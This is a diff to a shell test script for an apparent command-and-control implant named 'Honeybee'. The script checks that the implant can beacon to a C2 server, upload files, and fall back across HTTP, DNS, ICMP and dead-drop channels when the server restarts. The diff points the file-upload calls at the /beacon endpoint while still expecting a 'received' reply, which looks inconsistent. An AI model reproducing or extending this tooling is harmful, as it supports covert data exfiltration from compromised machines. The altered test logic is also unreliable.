@@ -32,7 +32,7 @@ BEACON=$(curl -sf -X POST "$C2_URL/beacon" -H "X-Agent-ID: test-001" \
     -d '{"hostname":"ftest","os":"linux"}' 2>/dev/null || echo "")
 echo "$BEACON" | grep -q "ack" && pass "Beacon via HTTP" || fail "Beacon failed: $BEACON"
 
-BEACON2=$(curl -sf -X POST "$C2_URL/collect" -H "X-Agent-ID: test-001" \
+BEACON2=$(curl -sf -X POST "$C2_URL/beacon" -H "X-Agent-ID: test-001" \
     -H "X-File-Name: test.txt" -d "FAILOVER_TEST_DATA" 2>/dev/null || echo "")
 echo "$BEACON2" | grep -q "received" && pass "Collect via HTTP" || fail "Collect failed: $BEACON2"
 
@@ -50,7 +50,7 @@ echo "  Honeybee will be configured with all 4 channel env vars"
 echo "  (this tests initialization, channel ordering, and graceful degradation)"
 
 export RUST_LOG="info,hive_base::c2_channels=debug,hive_base::comms=debug"
-export HIVE_C2_URL="${C2_URL}/collect"
+export HIVE_C2_URL="${C2_URL}/beacon"
 export HIVE_C2_DNS_DOMAIN="failover-test.example.com"
 export HIVE_C2_ICMP_TARGET="127.0.0.1"
 unset HIVE_C2_DEAD_DROP_TOKEN
@@ -87,7 +87,7 @@ C2PID=$!
 for i in $(seq 1 10); do sleep 1; curl -sf "$C2_URL/health" > /dev/null 2>&1 && { pass "C2 restarted"; break; }; [ "$i" -eq 10 ] && fail "C2 failed to restart"; done
 
 TEST_BODY="RESTORE_TEST_$(date +%s)"
-RESTORE=$(curl -sf -X POST "$C2_URL/collect" -H "X-Agent-ID: test-001" \
+RESTORE=$(curl -sf -X POST "$C2_URL/beacon" -H "X-Agent-ID: test-001" \
     -H "X-File-Name: restore.txt" -d "$TEST_BODY" 2>/dev/null || echo "")
 echo "$RESTORE" | grep -q "received" && pass "Collect works after C2 restart" || fail "Collect failed after restart"
 
